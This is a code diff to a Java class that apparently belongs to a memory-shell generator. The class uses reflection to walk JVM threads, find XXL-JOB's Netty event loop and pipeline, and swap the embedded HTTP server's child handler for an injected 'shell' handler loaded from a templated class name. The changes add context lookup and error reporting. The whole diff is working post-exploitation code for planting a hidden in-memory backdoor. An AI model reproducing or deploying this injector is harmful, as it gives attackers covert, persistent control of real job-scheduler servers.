@@ -12,6 +12,7 @@ import io.netty.handler.timeout.IdleStateHandler;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashSet;
@@ -26,6 +27,8 @@ import java.util.zip.GZIPInputStream;
  * @since 2025/1/21
  */
 public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel> {
+    private String msg = "";
+
     public String getClassName() {
         return "{{className}}";
     }
@@ -35,12 +38,26 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
     }
 
     public XxlJobNettyHandlerInjector() {
+        Object context = null;
         try {
-            handlerClass = getShellClass();
-            inject();
-        } catch (Exception e) {
-            e.printStackTrace();
+            context = getContext();
+        } catch (Throwable e) {
+            msg += "context error: " + getErrorMessage(e);
         }
+        try {
+            handlerClass = getShellClass(context);
+            msg += "context: [" + context + "] ";
+            inject(context);
+            msg += "[/*] ready\n";
+        } catch (Throwable e) {
+            msg += "failed " + getErrorMessage(e) + "\n";
+        }
+        System.out.println(msg);
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     private Class<?> handlerClass;
@@ -65,8 +82,8 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
                         })));
     }
 
-    private Class<?> getShellClass() throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+    private Class<?> getShellClass(Object context) throws Exception {
+        ClassLoader classLoader = context.getClass().getClassLoader();
         try {
             return classLoader.loadClass(getClassName());
         } catch (Exception e) {
@@ -77,28 +94,26 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
         }
     }
 
-    public void inject() throws Exception {
+    public Object getContext() throws Exception {
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
-            if (thread != null && thread.getName().contains("nioEventLoopGroup")) {
-                Object target;
-                try {
-                    target = getFieldValue(getFieldValue(getFieldValue(thread, "target"), "runnable"), "val$eventExecutor");
-                    if (target.getClass().getName().endsWith("NioEventLoop")) {
-                        HashSet<?> set = (HashSet<?>) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
-                        if (!set.isEmpty()) {
-                            Object keys = set.toArray()[0];
-                            Object pipeline = getFieldValue(getFieldValue(keys, "attachment"), "pipeline");
-                            Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, "head"), "next"), "handler");
-                            setFieldValue(embedHttpServerHandler, "childHandler", this);
-                            System.out.println("xxl-job NettyHandler inject successful");
-                            break;
-                        }
-                    }
-                } catch (Exception ignored) {
-                }
+            if (thread == null
+                    || !thread.getName().contains("nioEventLoopGroup")) {
+                continue;
+            }
+            Object target = getFieldValue(getFieldValue(getFieldValue(thread, "target"), "runnable"), "val$eventExecutor");
+            if (target.getClass().getName().endsWith("NioEventLoop")) {
+                HashSet<?> set = (HashSet<?>) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
+                Object keys = set.toArray()[0];
+                return getFieldValue(getFieldValue(keys, "attachment"), "pipeline");
             }
         }
+        return null;
+    }
+
+    public void inject(Object pipeline) throws Exception {
+        Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, "head"), "next"), "handler");
+        setFieldValue(embedHttpServerHandler, "childHandler", this);
     }
 
     @SuppressWarnings("all")
@@ -159,5 +174,20 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
     public void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
         final Field field = getField(obj.getClass(), fieldName);
         field.set(obj, value);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
